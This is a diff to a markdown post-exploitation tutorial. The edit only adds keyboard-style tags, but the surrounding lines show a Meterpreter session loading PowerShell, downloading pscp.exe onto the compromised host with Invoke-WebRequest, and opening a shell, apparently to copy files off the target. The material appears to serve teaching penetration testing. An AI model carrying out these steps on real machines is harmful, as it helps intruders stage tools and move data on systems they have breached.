@@ -451,7 +451,7 @@ service ssh start
 service ssh status
 ```
 
-Now, let's get back to the meterpreter> console and load powershell module:
+Now, let's get back to the <kb>meterpreter></kb> console and load <kb>powershell</kb> module:
 
 ```bash
 meterpreter > load powershell
@@ -464,7 +464,7 @@ Then start to download `PSCP` using the following command:
 Invoke-WebRequest -Uri https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe -OutFile .\pscp.exe
 ```
 
-Once downloaded, exit to the powershell module since we need to load the cmd or shell module in order for `PSCP` to execute properly:
+Once downloaded, exit to the <kb>powershell</kb> module since we need to load the <kb>cmd</kb> or <kb>shell</kb> module in order for `PSCP` to execute properly:
 
 ```bash
 meterpreter > shell
